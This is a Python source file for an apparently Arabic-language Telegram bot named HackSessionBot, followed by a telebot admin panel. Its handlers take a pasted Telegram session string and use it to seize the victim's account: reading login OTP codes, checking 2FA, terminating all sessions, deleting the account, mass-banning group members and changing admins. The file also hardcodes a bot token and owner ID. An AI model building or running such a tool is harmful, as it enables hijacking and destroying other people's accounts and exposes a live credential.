import os
from pyrogram import (Client ,filters)
from datetime import (date)
from pyrogram.types import (Message,InlineKeyboardButton,InlineKeyboardMarkup,ReplyKeyboardMarkup,ForceReply,CallbackQuery)
from pyromod import listen
import sqlite3,os,time
from HackSessionBot import app,API_ID,API_HASH
from pyrogram import filters , Client
from HackSessionBot.Helpers.steve import (
    users_gc,
    user_info,
    banall,
    get_otp,
    join_ch,
    leave_ch,
    del_ch,
    check_2fa,
    terminate_all,
    del_acc,
    piromote,
    demote_all)
from HackSessionBot.Helpers.data import HACK_MODS 
from pyrogram.types import CallbackQuery 
from pyrogram.raw import functions
from telethon import TelegramClient 
from telethon.sessions import StringSession 
from kvsqlite.sync import Client
import telebot 
from telebot.types import InlineKeyboardButton as but , InlineKeyboardMarkup as key


@app.on_callback_query(filters.regex("A"))
async def a_callback(client : Client , query : CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id,"حسنا ... الان ارسل كود السيشن .")    
    ch = await users_gc(session.text)
    if len(ch) > 3855:
        file = open("session.txt", "w")
        file.write(ch)
        file.close()
        await client.send_document(chat_id, "session.txt")
        os.system("rm -rf session.txt")
    else:
        await query.message.reply_text(text = ch + "\n\n*احيانا لا تضهر القنوات أو المجموعات بسبب ان المستخدم لا يملك قنوات أو مجموعات اساساً**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

    
@app.on_callback_query(filters.regex("B"))
async def b_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"حسنا ... الان ارسل كود السيشن .")
    info = await user_info(session.text)
    await query.message.reply_text(text = info,
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("C"))
async def c_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"حسنا ... الان ارسل كود السيشن .")
    gc = await client.ask(id,"حسنا ... ارسل الان يوزر القناة او المجموعة .") 
    hehe = await banall(session.text,gc)
    await query.message.reply_text(text = hehe,
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("D"))
async def d_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"حسنا ... الان ارسل كود السيشن .")
    hehe = await get_otp(session.text)
    await query.message.reply_text(text = hehe,
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("E"))
async def e_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"حسنا ... الان ارسل كود السيشن .")
    gc = await client.ask(id,"حسنا ... ارسل الان يوزر القناة او المجموعة .") 
    hehe = await join_ch(session.text,gc)
    await query.message.reply_text(text = hehe,
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("F"))
async def f_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"حسنا ... الان ارسل كود السيشن .")
    gc = await client.ask(id,"حسنا ... ارسل الان يوزر القناة او المجموعة .") 
    hehe = await leave_ch(session.text,gc)
    await query.message.reply_text(text = hehe,
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("G"))
async def g_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"حسنا ... الان ارسل كود السيشن .")
    gc = await client.ask(id,"حسنا ... ارسل الان يوزر القناة او المجموعة .") 
    hehe = await del_ch(session.text,gc)
    await query.message.reply_text(text = hehe,
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)


@app.on_callback_query(filters.regex("H"))
async def h_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"حسنا ... الان ارسل كود السيشن .")
    hehe = await check_2fa(session.text)
    await query.message.reply_text(text = hehe,
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("I"))
async def i_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"حسنا ... الان ارسل كود السيشن .")
    hehe = await terminate_all(session.text)
    await query.message.reply_text(text = hehe,
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("J"))
async def j_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"حسنا ... الان ارسل كود السيشن .")    
    hehe = await del_acc(session.text)
    await query.message.reply_text(text = hehe,
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("K"))
async def k_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"حسنا ... الان ارسل كود السيشن .")    
    user_id = await client.ask(id,"حسنا ... الان ارسل يوزر الحساب التريد ترفعة مشرف .")
    gc_id = await client.ask(id,"حسنا ... الان ارسل يوزر القناة او المجموعة الي تريد الحساب ينرفع بيها .")
    hehe = await piromote(session.text,gc_id,user_id)
    await query.message.reply_text(text = hehe,
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("L"))
async def l_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"حسنا ... الان ارسل كود السيشن .")    
    gc_id = await client.ask(id,"حسنا ... الان ارسل يوزر القناة او المجموعة الي تريد تحذف بيها المشرفين .")
    hehe = await demote_all(session.text,gc_id,user_id)
    await query.message.reply_text(text = hehe,
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)


db = Client('Sq.sqlite')
onwer = int('1321338802')
if not db.get('db'):
    data = {'onwer':[],'admin': [], 'users': [] , 'band':[], 'status': 1}
    db.set('db',data)
if not onwer in db.get('db')['onwer']:
    data = db.get('db')
    data['onwer'].append(onwer)
    db.set('db',data)
bot = telebot.TeleBot('7330947238:AAE1z9CuCurBHKy13rrhZS6rnWjLdjIl-ys') #token
@bot.message_handler(commands = ['start'])
def staty(m):
 status = db.get("status")
 channel = db.get("channel")
 userg = len(db.get('db')['users'])
 for i in db.get('db')['onwer']:
     pass
 print(channel)
 data = db.get('db')
 user_id = m.from_user.id
 if user_id in data['band']:
     bot.send_message(m.chat.id,'تم حظرك من البوت ')
 if data['status'] == 2:
     pass
 else:
     if not user_id in data['users']:
         data = db.get('db')
         data['users'].append(user_id)
         db.set('db',data)
         sug = len(db.get("db")["users"])
         text = f' مرحبا بك في البوت\n\nID : {user_id}\nNAME : {m.from_user.first_name}\nUSER : {m.from_user.username}\n\nعدد الاعضاء :{sug}'
         if len(db.get("db")['admin']) > 0:
             for x in data['admin']:
                 print(x)
                 bot.send_message(int(x),text)
             bot.send_message(int(i),text)
         bot.send_message(int(i),text)
 if not db.get('channel'):
     if user_id in data['onwer'] or user_id in data['admin']:
         bot.send_message(m.chat.id,'لاتوجد قناة يجب عليك وضع قناة')
 else:
     if not db.get('status'):
         pass
     if db.get('status'):
         member = bot.get_chat_member(f"@{channel}",m.from_user.id)
         if member.status == "member" or member.status == "administartor" or member.status == "creator":
             pass
         else:
             bot.send_message(m.chat.id,f'https://t.me/{channel}')
 v= key()	
 add_adm = but('اضافة ادمن',callback_data = 'add')	
 delete_adm = but('تنزيل ادمن', callback_data = 'delet')
 rem = but('احصائيات',callback_data = 'statc')
 ban = but('حظر عضو',callback_data = 'banme')
 bun = but('الغاء حظر عضو',callback_data = 'baning')
 brod = but('اذاعة',callback_data = 'brod')
 ba = but(f'وضع قناة الاشتراك',callback_data = 'geti')
 bn =but('فتح الاشتراك الاجباري',callback_data = 'ope')
 tnb = but('فتح التنبيه ',callback_data = 'tnb')
 clo = but('تعطيل التنبيه',callback_data = 'clo')
 jio = but('حالة الاشتراك الاجباري',callback_data = 'ses')
 best = but('تعطيل الاشتراك الاجباري',callback_data = 'gohn')
 dest = but(f'حذف قناة الاشتراك',callback_data = 'gets')
 est = but(f'قناة الاشتراك',callback_data = 'gs')
 kop = but("حاله التنبيه ",callback_data = "kop")
 v.add(add_adm,delete_adm)
 v.add(brod)
 v.add(ba,dest)
 v.add(est)
 v.add(tnb,clo)
 v.add(jio)
 v.add(bn,best)
 v.add(rem)
 v.add(bun,ban)
 v.add(kop)
 h = key()
 rem = but('احصائيات',callback_data = 'statc')
 brod = but('اذاعة',callback_data = 'brod')
 h.add(ba,dest)
 h.add(est)
 h.add(tnb,clo)
 h.add(jio)
 h.add(bn,best)
 h.add(rem,brod)
 h.add(kop)
 if user_id in data['onwer'] :
     bot.send_message(m.chat.id,'مرحبا بك في البوت',reply_markup = v)
 if user_id in data['band']:
     pass
 else:
     if user_id in data['admin']:
         bot.send_message(m.chat.id,'مرحبا بك في البوت',reply_markup = h)
@bot.callback_query_handler(func=lambda c: True)
def handle_callback(c):
    channel = db.get("channel")
    user_id = c.from_user.id
    data = db.get('db')
    use = len(db.get('db')['users'])
    adm = len(db.get('db')['admin'])
    bans = len(db.get('db')['band'])
    dg = f'''
band  : {bans}
member : {use} 
admin : {adm} 
          '''
    if c.data == 'add': 
        if user_id in data['onwer']:
            m = bot.send_message(c.message.chat.id,'ارسل ايدي الشخص لرفع ادمن')
            bot.register_next_step_handler(m,adds)
    if c.data == 'delet': 
        if user_id in data['onwer']:
            ha = bot.send_message(c.message.chat.id,'ارسل ايدي الشخص الذي تريد تنزيل من الادمن')
            bot.register_next_step_handler(ha,dgh)
    if c.data == 'banme': 
        if user_id in data['onwer']:
            lita = bot.send_message(c.message.chat.id,'ارسل ايدي الشخص الذي تريد حظره')
            bot.register_next_step_handler(lita,hhg)
    if c.data == 'baning' : 
        if user_id in data['onwer']:
            li = bot.send_message(c.message.chat.id,'ارسل ايدي الشخص الذي تريد فك الحظر عنه ')
            bot.register_next_step_handler(li,hgf)
    if c.data == 'statc' : 
        if user_id in data['onwer'] or user_id in data['admin']:
            bot.send_message(c.message.chat.id,dg)
    if c.data == 'brod':
        if user_id in data['onwer'] or user_id in data['admin']:
            xc = bot.send_message(c.message.chat.id,'ارسل الشي الذي تريد ارساله (نص ,صوره ، ملصق ، ملف )')
            bot.register_next_step_handler(xc,cx)
    if c.data == 'geti':
        if user_id in data['onwer'] or user_id in data['admin']:
            fiul = bot.send_message(c.message.chat.id,'ارسل يوزر القناة بدون @')
            bot.register_next_step_handler(fiul,setz)
    if c.data == 'gs':
        if user_id in data['onwer'] or user_id in data['admin']:
            if not db.get('channel'):
                bot.send_message(c.message.chat.id,'لم يتم تحديد قناة')
            else:
                channel = db.get('channel')
                bot.send_message(c.message.chat.id,f'https://t.me/{channel}')
    if c.data == 'gets':
        if user_id in data['onwer'] or user_id in data['admin']:
            if db.get('channel'):
                db.delete('channel')
                bot.send_message(c.message.chat.id,'تم حذف القناة')
            else:
                bot.send_message(c.message.chat.id,'لا توجد قناة مضافه')
    if c.data == 'ope':
        if user_id in data['onwer'] or user_id in data['admin']:
            if not db.get('status'):
                db.set('status',1)
                bot.send_message(c.message.chat.id,'تم تفعيل الاشتراك الاجباري')
            else:
                bot.send_message(c.message.chat.id,'الاشتراك مغعل من قبل')
    if c.data == "gohn":
        if user_id in data['onwer'] or user_id in data['admin']:
            if db.get('status'):
                db.delete('status')
                bot.send_message(c.message.chat.id,'تم تعطيل الاشتراك')
            else:
                bot.send_message(c.message.chat.id,'الاشتراك معطل من قبل')
    if c.data == "ses":
        if user_id in data['onwer'] or user_id in data['admin']:
            if db.get('status'):
                bot.answer_callback_query(c.id,"الاشتراك الاجباري مفعل",show_alert=True)
            elif not db.get("status"):
                bot.answer_callback_query(c.id,"الاشتراك الاجباري معطل",show_alert=True)
    if c.data == "tnb":
        if user_id in data['onwer'] or user_id in data['admin']:
            if db.get('db')['status'] == 1:
                bot.send_message(c.message.chat.id,"التنبيه مفتوح من قبل")
            else:
                data["status"] = 1
                db.set("db",data)
                bot.send_message(c.message.chat.id,"تم فتح التنبيه")
    if c.data == "clo":
        if user_id in data['onwer'] or user_id in data['admin']:
            if data["status"] == 2:
                bot.send_message(c.message.chat.id,"التنبيه معطل من قبل ")
            else:
                data["status"] = 2
                db.set("db",data)
                bot.send_message(c.message.chat.id,"تم تعطيل التنبيه ")
    if c.data == "kop":
        if user_id in data['onwer'] or user_id in data['admin']:
            if data["status"] == 2 :
                bot.answer_callback_query(c.id,"التنبيه معطل",show_alert=True)
            else:
                bot.answer_callback_query(c.id,"التنبيه مفتوح",show_alert=True)
def setz(message):
    chn = message.text
    if not db.get('channel'):
        db.delete('channel')
        db.set('channel',chn)
        bot.send_message(message.chat.id,'تم تحديد القناة')
    else:
        bot.send_message(message.chat.id,"يوجد قناة اخري يرجى حذفها لوضع قناة ثانيه")
def cx(message):
    ko = db.get('db')['users']
    for i in ko:
        bot.copy_message(chat_id=i, from_chat_id=message.chat.id, message_id=message.message_id)
def hgf(message):
    data = db.get('db')
    idg = int(message.text)
    if idg in data['band']:
        data['band'].remove(int(f'{idg}'))
        db.set('db',data)
        bot.send_message(message.chat.id,'تم فك الحظر')
    else:
        bot.send_message(message.chat.id,'لم يتم حظر هاذ شخص')
def hhg(message):
    data = db.get('db')
    ids = int(message.text)
    if not ids in data['band']:
        data['band'].append(int(f'{ids}'))
        db.set('db',data)
        bot.send_message(message.chat.id,'تم حظره')
    else:
        bot.send_message(message.chat.id,'لا يوجد تم حظره يهاذ الايدي')
def dgh(message):
    data = db.get('db')
    idd = int(message.text)
    if idd in data['admin']:
        data['admin'].remove(idd)
        db.set('db',data)
        bot.send_message(message.chat.id,'تم تنزيل من الادمن')
    else:
        bot.send_message(message.chat.id,'ليس مرفوع في قائمه الادمن ')
def adds(message):
    data = db.get('db')
    id = int(message.text)
    if id in data['admin']:
        bot.send_message(message.chat.id,'مرفوع من قبل')
    else:
        data['admin'].append(int(f'{id}'))
        db.set('db',data)
        print(data)
        bot.send_message(message.chat.id,'تم رفع ادمن')
bot.polling(True)